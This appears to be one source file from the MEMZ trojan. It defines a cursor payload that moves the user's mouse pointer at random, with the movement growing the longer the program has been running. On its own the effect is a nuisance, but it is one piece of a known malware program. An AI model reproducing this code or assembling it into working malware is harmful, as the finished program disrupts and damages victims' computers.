#include "../MEMZ.h"

PAYLOADFUNCTIONDEFAULT(payloadCursor) {
	PAYLOADHEAD

	POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 7 - 1) * (random() % (runtime / 2200 + 2)), cursor.y + (random() % 7 - 1) * (random() % (runtime / 2200 + 2)));

	out: return 2;
}
